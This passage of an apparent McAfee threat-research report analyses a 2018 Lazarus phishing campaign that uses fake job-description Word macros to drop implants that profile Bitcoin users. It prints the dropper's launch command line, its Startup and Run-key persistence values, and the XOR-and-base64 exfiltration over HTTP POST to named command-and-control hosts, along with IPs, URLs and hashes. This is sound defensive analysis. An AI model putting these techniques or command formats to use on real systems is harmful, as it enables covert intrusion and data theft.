When victims open malicious documents attached to the emails, the malware scans for Bitcoin\nactivity and then establishes an implant for long-term data-gathering.\n\nHaoBao targets and never-before-seen implants signal to McAfee ATR an ambitious campaign by Lazarus to establish cryptocurrency\ncybercrime at a sophisticated level.\n\n## Background\n\nBeginning in 2017, the Lazarus group heavily targeted individuals with spear phishing emails impersonating job recruiters which contained\nmalicious documents. The campaign lasted from April to October and used job descriptions relevant to target organizations, in both English\nand Korean language. The objective was to gain access to the target’s environment and obtain key military program insight or steal money.\nThe 2017 campaign targets ranged from defense contractors to financial institutions, including crypto currency exchanges, however; much\nof this fake job recruitment activity ceased months later, with the last activity observed October 22, 2017.\n\n## Analysis\n\nOn January 15, McAfee ATR discovered a malicious document masquerading as a job recruitment for a Business Development Executiveth\nlocated in Hong Kong for a large multi-national bank. The document was distributed via a Dropbox account at the following URL:\n\nhxxps://www.dropbox.com/s/qje0yrz03au66d0/JobDescription.doc?dl=1\n\nThis is the mark of a new campaign, though it utilizes techniques, tactics and procedures observed in 2017. This document had the last\nauthor ‘Windows User’ and was created January 16, 2018 with Korean language resources. Several additional malicious documents with\nthe same author appeared between January 16 though January 24, 2018.\n\nDocument summary from Virus Total\n\nMalicious job recruitment documents\n\n\n-----\n\nVictims are persuaded to enable content through a notification claiming the document was created in an earlier version of Microsoft Word.\nThe malicious documents then launch an implant on the victim’s system via a Visual Basic macro.\n\nMalicious Microsoft Word document\n\nImplants dropped in\n\ncampaign\nThe document (7e70793c1ca82006775a0cac2bd75cc9ada37d7c) created January 24, 2018 drops and executes an implant compiled\nJanuary 22, 2018 with the name lsm.exe (535f212b320df049ae8b8ebe0a4f93e3bd25ed79). The implant lsm.exe contacted 210.122.7.129\nwhich also resolves to worker.co.kr.Implants dropped in campaign\n\nThe other malicious document ( a79488b114f57bd3d8a7fa29e7647e2281ce21f6) created January 19, 2018 drops the implant\n(afb2595ce1ecf0fdb9631752e32f0e32be3d51bb); which is 99% similar-to the lsm.exe implant.\n\nThis document was distributed from the following Dropbox URLs:\n\nhxxps://dl.dropboxusercontent.com/content_link/AKqqkZsJRuxz5VkEgcguqNE7Th3iscMsSYvivwzAYuTZQWDBLsbUb7yBdbW2lHos/file?\ndl=1\nhxxps://www.dropbox.com/s/q7w33sbdil0i1w5/job description.doc?dl=1\n\n\n-----\n\nHTTP response for job description document\nThis implant (csrss.exe) compiled January 15, 2018 contacts an IP address 70.42.52.80 which resolves to deltaemis.com. We identified that\nthis domain was used to host a malicious document from a previous 2017 campaign targeting the Sikorsky program.\n\nhxxp://deltaemis.com/CRCForm/3E_Company/Sikorsky/E4174/JobDescription.doc\n\nA third malicious document (dc06b737ce6ada23b4d179d81dc7d910a7dbfdde) created January 19, 2018 drops\ne8faa68daf62fbe2e10b3bac775cce5a3bb2999e which is compiled January 15, 2018. This implant communicates to a South Korean IP\naddress 221.164.168.185 which resolves to palgong-cc.co.kr.\n\nMcAfee ATR analysis finds the dropped implants have never been seen before in the wild and have not been used in previous Lazarus\ncampaigns from 2017. Furthermore, this campaign deploys a one-time data gathering implant that relies upon downloading a second stage\nto gain persistence. The implants contain a hardcoded word “haobao” that is used as a switch when executing from the Visual Basic macro.\n\n## Malicious Document Analysis\n\nThe malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code. The payloads are\npresent as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary\nlaunched first and then the decoy document).\n\nThe VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via “Sub\nAutoOpen()”). The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:\n\nDecodes the target file path of the second stage binary payload. This file path is calculated based on the current user’s Temp folder\nlocation:\n\n<temp_dir_path>\\.\\lsm.exe\n\nVB code to decrypt second stage filepath\n\nDecodes the second stage binary in memory and writes it to the %temp%\\.\\lsm.exe file location\n\n\n-----\n\nsecond stage binary (MZ) as an encrypted String Array in the VBA Macro\n\nsecond stage binary (MZ) decoded in memory by the VBA Macro\n\nAfter writing the second stage payload to disk the VBA code performs two important actions.\n\nRuns the second stage payload using cmd.exe. This is done so that the cmd.exe process exists as soon as the payload is\nlaunched. This way a process enumeration tool cannot find the parent process => Smaller footprint.\n\ncmdline for executing the second stage binary:\n\ncmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao\n\nAdds persistence on the system by creating a shortcut in the user’s Startup folder with the correct cmdline arguments:\n\nLink file command line: <temp_dir_path>\\.\\lsm.exe /haobao\n\nLink File Name: GoogleUpdate.lnk\n\n\n-----\n\nTrigger code for executing the second stage binary and establishing persistence\n\nLNK file configuration for establishing persistence\n\nOnce the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user. This\ndecoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload). The decoy\ndocument is again written to the user’s temp directory to the following filename/path:\n\n<temp_dir_path>\\.\\Job Description.doc\n\nDecoy Document decoded in memory by the VBA Macro\n\nOnce the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden\nThe decoy document is then opened by the malicious VBA Macro and the original malicious document’s caption is copied over to the\ndecoy document to trick the end user into mistaking the decoy document for the original (malicious) document.\nThis activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro\naims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened\nby the user.\nSince the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.\n\n## Implant Analysis\n\nAs part of the implant initialization activities the implant does the following;\n\nChecks the string passed to it through command line\n\n“/haobao” in case of 535f212b320df049ae8b8ebe0a4f93e3bd25ed79\n“/pumpingcore” in case of e8faa68daf62fbe2e10b3bac775cce5a3bb2999e\n\nIf the malware does not find this string in its cmdline arguments, it simply quits without going any further.\n\nUnwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection. DLL information.\n\nDuring our research, we discovered additional variants of the DLL file.\n\n\n-----\n\nDLL information\n\nAs part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:\n\nCopy the unwrapped DLL into new locations in its own memory space.\nBuild imports required by the DLL (based on the IAT of the DLL)\n\n\n-----\n\nImports builder code in\n\nmalware for the DLL imports\n\nCall the newly loaded DLL image’s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in\nthe malware process.\n\n\n-----\n\nDLL Entry Point Call from malware to finish loading of the DLL in memory\n\nCall the actual malicious export in the DLL named “CoreDn”\n\nHardcoded DLL export name “CoreDn” in malware\n\nAll the malicious activities described below are performed by the DLL unless specified otherwise.\n\n## Data Reconnaissance\n\nThe implant has the capability of gathering data from the victim’s system. The following information will be gathered and sent to the\ncommand and control server.\n\nComputer name and currently logged on user’s name, stored in the format\n\n<ComputerName> \\ <Username>\n\nMalware obtaining the computer name and user\n\nname\n\nList of all processes currently running on the system arranged in format\n\n<Process Name>\\r\\n\n\n<Process Name>\\r\\n\n\n<Process Name>\\r\\n\n\n<Process Name>\\r\\n\n\n\n-----\n\nMalware collecting process\n\ninformation from endpoint\n\nThe presence of a specific registry key on the system\n\nHKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\n\nThe malware appends an indicator (flag) specifying whether the above registry key was found in the user’s registry:\n\n\n-----\n\nThis key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control\nin the HTTP POST request as well (explained in the below).\n\nMalware checking for the\n\npresence of the registry key\n\n## Exfiltration\n\n**Preparation**\n\nIn preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:\n\nEncode the collected information using a simple byte based XOR operation using the byte key: 0x34.\nBase64 encode (standard) the XORed data.\nAgain, check for the presence of the Registry Key: HKCU\\Software\\Bitcoin\\Bitcoin-Qt\n\n**Command and Control Server Communication**\n\nOnce the malware has performed all these activities it sends an HTTP POST request to the CnC server:\n\nwww[dot]worker.co.kr for md5 BDAEDB14723C6C8A4688CC8FC1CFE668\nwww[dot]palgong-cc.co.kr for md5 D4C93B85FFE88DDD552860B148831026\n\nIn the format:\n\nHTTP POST to www[dot]worker.co.kr\n\n/board2004/Upload/files/main.asp?idx=%d&no=%s&mode=%s\n\nOR\n\nHTTP POST to www[dot]palgong-cc.co.kr\n\n/html/course/course05.asp?idx=%d&no=%s&mode=%s\n\n\n-----\n\nwhere\n\nidx= 20 (14h) if the Registry key does not exist; 24 (18h) if the key exists.\n\nno= XORed + base64 encoded “<Computername> \\ <username>”\n\nmode= XORed + base64 encoded Process listing + Registry key flag\n\nserver domain\n\n**Persistence**\n\n\nCommand and control\n\n\nThe persistence mechanism of the malware is performed only for the downloaded implant. Persistence is established for the implant via the\nvisual basic macro code initially executed upon document loading by the victim. This persistence is also performed ONLY if the malware\nsuccessfully executes the downloaded implant. The malware first tries to update the HKEY_LOCAL_MACHINE registry key.\n\nIf the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key. Value written to registry to achieve\npersistence on the endpoint:\n\nRegistry Subkey = Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nValue Name = AdobeFlash\n\nValue Content = “C:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\OneDrive.exe” kLZXlyJelgqUpKzP\n\n\n-----\n\nRegistry based persistence of the second stage payload\n\n## Connections to 2017 campaigns\n\nThe techniques, tactics and procedures are very similar to the campaigns that targeted US Defense contractors, US Energy sector, financial\norganizations and crypto currency exchanges in 2017.\n\nThe same Windows User author appeared back in 2017 in two malicious documents 비트코인_지갑주소_및_거래번호.doc and 비트코인 거\n래내역.xls which were involved in crypto currency targeting. Furthermore, one of the implants communicates to an IP address that was\ninvolved in hosting malicious job description documents in 2017 involving the Sikorsky military program.\n\n\n-----\n\nMcAfee Advanced Threat research determines with confidence that Lazarus is the threat group behind this attack for the following reasons:\n\nContacts an IP address / domain that was used to host a malicious document from a Lazarus previous campaign in 2017\nSame author appeared in these recent malicious documents that also appeared back in Lazarus 2017 campaigns\nUses the same malicious document structure and similar job recruitment ads as what we observed in past Lazarus campaigns\nThe techniques, tactics and procedures align with Lazarus group’s interest in crypto currency theft\n\n## Conclusion\n\nIn this latest discovery by McAfee ATR, despite a short pause in similar operations, the Lazarus group targets crypto currency and financial\norganizations. Furthermore, we have observed an increased usage of limited data gathering modules to quickly identify targets for further\nattacks. This campaign is tailored to identifying those who are running Bitcoin related software through specific system scans.\n\n## Indicators of Compromise\n\n**MITRE ATT&CK techniques**\n\nData encoding\nData encrypted\nCommand-Line Interface\nAccount discovery\nProcess Discovery\nQuery registry\nHidden files and directories\nCustom cryptographic protocol\nRegistry Run Keys / Start Folder\nStartup Items\nCommonly used port\nExfiltration Over Command and Control Channel\n\n**IPs**\n\n210.122.7.129\n70.42.52.80\n221.164.168.185\n\n**URLs**\n\nhxxps://dl.dropboxusercontent.com/content_link/AKqkZsJRuxz5VkEgcguqNE7Th3iscMsSYvivwzAYuTZQWDBLsbUb7yBdbW2lHos/file?\ndl=1\nhxxps://www.dropbox.com/s/q7w33sbdil0i1w5/job description.doc?dl=1\n\n**Hashes**\n\ndc06b737ce6ada23b4d179d81dc7d910a7dbfdde\na79488b114f57bd3d8a7fa29e7647e2281ce21f6\n7e70793c1ca82006775a0cac2bd75cc9ada37d7c\n535f212b320df049ae8b8ebe0a4f93e3bd25ed79\n1dd8eba55b16b90f7e8055edca6f4957efb3e1cd\nafb2595ce1ecf0fdb9631752e32f0e32be3d51bb\ne8faa68daf62fbe2e10b3bac775cce5a3bb2999e\n\n**McAfee Detection**\n\nBackDoor-FDRO!\nTrojan-FPCQ!\nRDN/Generic Downloader.x\nRDN/Generic Dropper\nRDN/Generic.dx\n\n\n-----\n\n[Ryan Sherstobitoff](https://www.mcafee.com/blogs/author/ryan-sherstobitoff/)\nRyan Sherstobitoff is a Senior Analyst for Major Campaigns – Advanced Threat Research in McAfee.
